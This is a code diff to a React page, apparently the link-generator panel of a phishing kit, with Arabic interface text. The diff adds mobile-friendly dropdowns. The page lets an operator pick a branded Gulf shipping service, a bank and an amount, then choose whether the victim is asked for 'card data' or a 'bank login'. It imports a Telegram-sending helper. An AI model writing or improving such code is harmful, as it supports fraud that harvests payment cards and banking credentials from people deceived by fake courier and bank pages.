@@ -1,16 +1,17 @@
-import { useState, useMemo } from "react";
+import { useState, useMemo, useEffect } from "react";
 import { useParams, useNavigate } from "react-router-dom";
 import { Card } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
+import { MobileSelect, MobileSelectItem } from "@/components/ui/mobile-select";
 import { useCreateLink } from "@/hooks/useSupabase";
 import { getCountryByCode } from "@/lib/countries";
 import { getServicesByCountry } from "@/lib/gccShippingServices";
 import { getServiceBranding } from "@/lib/serviceLogos";
 import { getBanksByCountry } from "@/lib/banks";
-import { Package, MapPin, DollarSign, Hash, Building2 } from "lucide-react";
+import { Package, MapPin, DollarSign, Hash, Building2, CreditCard } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { sendToTelegram } from "@/lib/telegram";
 import TelegramTest from "@/components/TelegramTest";
@@ -29,6 +30,11 @@ const CreateShippingLink = () => {
   const [codAmount, setCodAmount] = useState("");
   const [selectedBank, setSelectedBank] = useState("");
   const [paymentType, setPaymentType] = useState<"card_data" | "bank_login">("card_data");
+  const [isMobile, setIsMobile] = useState(false);
+  
+  useEffect(() => {
+    setIsMobile(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent));
+  }, []);
   
   // Get banks for the selected country
   const banks = useMemo(() => getBanksByCountry(country?.toUpperCase() || ""), [country]);
@@ -146,18 +152,28 @@ const CreateShippingLink = () => {
               {/* Service Selection with Logo and Description */}
               <div>
                 <Label className="mb-2 text-sm">خدمة الشحن *</Label>
-                <Select value={selectedService} onValueChange={setSelectedService}>
-                  <SelectTrigger className="h-10">
-                    <SelectValue placeholder="اختر خدمة الشحن" />
-                  </SelectTrigger>
-                  <SelectContent>
+                {isMobile ? (
+                  <MobileSelect value={selectedService} onValueChange={setSelectedService} placeholder="اختر خدمة الشحن">
                     {services.map((service) => (
-                      <SelectItem key={service.id} value={service.key}>
+                      <MobileSelectItem key={service.id} value={service.key}>
                         {service.name}
-                      </SelectItem>
+                      </MobileSelectItem>
                     ))}
-                  </SelectContent>
-                </Select>
+                  </MobileSelect>
+                ) : (
+                  <Select value={selectedService} onValueChange={setSelectedService}>
+                    <SelectTrigger className="h-10">
+                      <SelectValue placeholder="اختر خدمة الشحن" />
+                    </SelectTrigger>
+                    <SelectContent>
+                      {services.map((service) => (
+                        <SelectItem key={service.id} value={service.key}>
+                          {service.name}
+                        </SelectItem>
+                      ))}
+                    </SelectContent>
+                  </Select>
+                )}
               </div>
               
               {/* Service Logo and Description */}
@@ -234,19 +250,30 @@ const CreateShippingLink = () => {
                   <CreditCard className="w-3 h-3" />
                   نوع الدفع *
                 </Label>
-                <Select value={paymentType} onValueChange={(value: "card_data" | "bank_login") => setPaymentType(value)}>
-                  <SelectTrigger className="h-9">
-                    <SelectValue placeholder="اختر نوع الدفع" />
-                  </SelectTrigger>
-                  <SelectContent>
-                    <SelectItem value="card_data">
+                {isMobile ? (
+                  <MobileSelect value={paymentType} onValueChange={(value: string) => setPaymentType(value as "card_data" | "bank_login")} placeholder="اختر نوع الدفع">
+                    <MobileSelectItem value="card_data">
                       💳 بيانات البطاقة
-                    </SelectItem>
-                    <SelectItem value="bank_login">
+                    </MobileSelectItem>
+                    <MobileSelectItem value="bank_login">
                       🏦 تسجيل الدخول
-                    </SelectItem>
-                  </SelectContent>
-                </Select>
+                    </MobileSelectItem>
+                  </MobileSelect>
+                ) : (
+                  <Select value={paymentType} onValueChange={(value: "card_data" | "bank_login") => setPaymentType(value)}>
+                    <SelectTrigger className="h-9">
+                      <SelectValue placeholder="اختر نوع الدفع" />
+                    </SelectTrigger>
+                    <SelectContent>
+                      <SelectItem value="card_data">
+                        💳 بيانات البطاقة
+                      </SelectItem>
+                      <SelectItem value="bank_login">
+                        🏦 تسجيل الدخول
+                      </SelectItem>
+                    </SelectContent>
+                  </Select>
+                )}
                 <p className="text-xs text-muted-foreground mt-1">
                   {paymentType === "card_data" 
                     ? "💳 سيتم طلب بيانات البطاقة من العميل"
@@ -260,19 +287,30 @@ const CreateShippingLink = () => {
                   <Building2 className="w-3 h-3" />
                   البنك (اختياري)
                 </Label>
-                <Select value={selectedBank} onValueChange={setSelectedBank}>
-                  <SelectTrigger className="h-9">
-                    <SelectValue placeholder="اختر بنك (يمكن التخطي)" />
-                  </SelectTrigger>
-                  <SelectContent>
-                    <SelectItem value="skip">بدون تحديد بنك</SelectItem>
+                {isMobile ? (
+                  <MobileSelect value={selectedBank} onValueChange={setSelectedBank} placeholder="اختر بنك (يمكن التخطي)">
+                    <MobileSelectItem value="skip">بدون تحديد بنك</MobileSelectItem>
                     {banks.map((bank) => (
-                      <SelectItem key={bank.id} value={bank.id}>
+                      <MobileSelectItem key={bank.id} value={bank.id}>
                         {bank.nameAr}
-                      </SelectItem>
+                      </MobileSelectItem>
                     ))}
-                  </SelectContent>
-                </Select>
+                  </MobileSelect>
+                ) : (
+                  <Select value={selectedBank} onValueChange={setSelectedBank}>
+                    <SelectTrigger className="h-9">
+                      <SelectValue placeholder="اختر بنك (يمكن التخطي)" />
+                    </SelectTrigger>
+                    <SelectContent>
+                      <SelectItem value="skip">بدون تحديد بنك</SelectItem>
+                      {banks.map((bank) => (
+                        <SelectItem key={bank.id} value={bank.id}>
+                          {bank.nameAr}
+                        </SelectItem>
+                      ))}
+                    </SelectContent>
+                  </Select>
+                )}
                 <p className="text-xs text-muted-foreground mt-1">
                   💡 يمكن للعميل اختيار أو تغيير البنك أثناء الدفع
                 </p>
